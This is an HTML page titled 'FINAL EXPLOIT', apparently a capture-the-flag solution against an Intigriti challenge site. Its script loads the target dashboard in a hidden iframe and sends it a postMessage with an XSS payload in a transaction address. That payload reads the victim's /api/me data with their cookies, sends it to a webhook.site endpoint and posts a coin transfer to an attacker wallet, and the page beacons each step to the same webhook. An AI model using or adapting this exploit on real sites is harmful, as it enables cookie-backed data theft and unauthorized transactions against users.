<!DOCTYPE html>
<html>
<head><title>FINAL</title></head>
<body>
<h1>FINAL EXPLOIT</h1>
<div id="log"></div>
<script>
const T = 'https://challenge-0126.intigriti.io';
const W = 'https://webhook.site/8089eff3-ae85-4c51-954d-02c7930883b9';
const WALLET = '1f9c3f0d5ebe9960d50b5e030572d264df';
let s = 0;

function log(m) { s++; document.getElementById('log').innerHTML += '<div>['+s+'] '+m+'</div>'; new Image().src = W+'/?step='+s+'&msg='+encodeURIComponent(m); }

async function exploit() {
    log('STARTING');

    // Load dashboard in iframe (has admin cookies)
    log('Loading dashboard...');
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = T + '/dashboard.html';
    document.body.appendChild(iframe);

    await new Promise(r => iframe.onload = r);
    await new Promise(r => setTimeout(r, 3000));
    log('Dashboard loaded');

    // Send transaction to create entry in dashboard with XSS payload
    log('Sending transaction with XSS in address...');
    iframe.contentWindow.postMessage({
        type: 'submitTransaction',
        transaction: {
            toAddress: `');fetch('${W}/?xss=dashboard',{mode:'no-cors'});fetch('${T}/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('${W}/?FLAG='+encodeURIComponent(JSON.stringify(d)),{mode:'no-cors'}));fetch('${T}/api/transaction',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({toAddress:'${WALLET}',currency:'1337COIN',amount:1})}).then(()=>fetch('${W}/?COIN_SENT',{mode:'no-cors'}));//`,
            currency: '1337COIN',
            amount: 0
        }
    }, '*');
    log('XSS payload sent');

    await new Promise(r => setTimeout(r, 3000));
    log('Opening dashboard to trigger XSS...');
    window.open(T + '/dashboard.html', '_blank');
    log('DONE');
}

setTimeout(exploit, 1000);
</script>
</body>
</html>
